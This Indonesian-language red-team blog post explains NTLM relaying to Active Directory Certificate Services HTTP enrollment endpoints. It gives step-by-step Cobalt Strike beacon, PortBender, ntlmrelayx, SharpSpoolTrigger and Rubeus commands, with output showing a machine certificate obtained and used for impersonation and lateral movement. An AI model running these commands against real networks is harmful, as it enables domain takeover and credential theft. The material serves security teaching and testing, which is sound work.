---
title: '[AD CS] NTLM Relaying to ADCS HTTP Endpoints'
date: 2023-08-02 03:15:22 +0700
categories: ['Active Directory', 'Post Compromise Attack']
tags: [red team, active directory hacking, windows hacking, post compromise attack, ad cs]     # TAG names should always be lowercase
author: nairpaa
---

AD CS *service* mendukung metode *enrollment* HTTP (GUI), *endpoint*-nya bisa ditemukan di `http[s]://<hostname>/certsrv`.

![AD CS HTTP Enrollment](/assets/img/posts/ntlm-relaying-to-ad-cs-http/1.png)
_AD CS HTTP Enrollment_

Untuk mengakses web tersebut membutuhkan kredensial yang valid.

Jika autentikasi NTLM diaktifkan, *endpoint* web ini rentan terhadap serangan NTLM *relay*.  

Metode penyalahgunaan yang umum adalah memaksa Domain Control untuk mengautentikasi ke lokasi yang dikendalikan penyerang, meneruskan permintaan ke CA untuk mendapatkan sertifikat untuk DC tersebut, dan kemudian menggunakannya untuk mendapatkan TGT.

Aspek penting yang perlu diperhatikan adalah Anda tidak dapat me-*relay* autentikasi NTLM kembali ke mesin asal.  Oleh karena itu, kita tidak dapat me-*relay* DC ke CA jika *service* tersebut berjalan pada mesin yang sama.

Cara lain yang baik untuk mengatasi hal ini adalah dengan mendapatkan akses ke mesin yang dikonfigurasi untuk [Unconstrained Delegation](/posts/kerberos-unconstrained-delegation/).

## 0x1 - Exploitation Stages

### Step 1: Setting up NTLM Relay

Untuk mencapai hal ini, kita membutuhkan:
- PortBender pada *compromised* mesin untuk menangkap *traffic* pada port 445 dan mengarahkannya ke port 8445.
- Sebuah *reverse port forward* untuk meneruskan *traffic* yang mengenai port 8445 ke Team Server pada port 445.
- Sebuah proxy SOCKS untuk ntlmrelayx.

```powershell
# Mengizinkan koneksi port pada firewall
beacon> powershell New-NetFirewallRule -DisplayName "8445-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8445
beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080

# Mengatur reverse port forward
beacon> rportfwd 8445 localhost 445
beacon> rportfwd 8080 localhost 80

# Mengatur PortBender
beacon> cd C:\Windows\system32\drivers
beacon> upload C:\Tools\PortBender\WinDivert64.sys
beacon> PortBender redirect 445 8445

# Menjalankan SOCKS5
beacon> socks 1080 socks5 disableNoAuth socks_user socks_password enableLogging
```

```bash
# Menjalankan NTLMRelay
➜ sudo proxychains ntlmrelayx.py -t https://10.10.122.10/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

[*] Protocol Client SMTP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
```

### Step 2: Waiting For Incoming Communication


```powershell
# Memaksa otentikasi dengan memanfaatkan Unconstrained Delegation 
PS > .\SharpSpoolTrigger.exe <target> <listener>
PS > .\SharpSpoolTrigger.exe 10.10.122.30 10.10.123.102
```

```bash
[*] Servers started, waiting for connections
[*] SMBD-Thread-4: Received connection from 127.0.0.1, attacking target https://10.10.122.10
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.122.10:443-<><>-OK
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against https://10.10.122.10 as DEV/WEB$ SUCCEED
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] GOT CERTIFICATE! ID 13
[*] Base64 certificate of user WEB$:MIIRRQ[...]qDRJLE
```

Trik [S4U2Self Abuse](/posts/s4u2self-abuse/) dapat digunakan untuk mendapatkan TGS yang dapat digunakan untuk *lateral movement*.

```powershell
# Request tgt
PS > .\Rubeus.exe asktgt /user:web$ /certificate:asdasd[....]asdasd /nowrap

# S4U
PS > .\Rubeus.exe s4u /impersonateuser:namina /self /altservice:cifs/web.dev.example.io /user:dc-2$ /ticket:doIFuj[...]lDLklP /nowrap

# Generate createnetonly
PS > .\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:namina /password:FakePass /ticket:doIF[...]
```

---

## 0x2 - References

- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/adcs-+-petitpotam-ntlm-relay-obtaining-krbtgt-hash-with-domain-controller-machine-certificate
- https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/
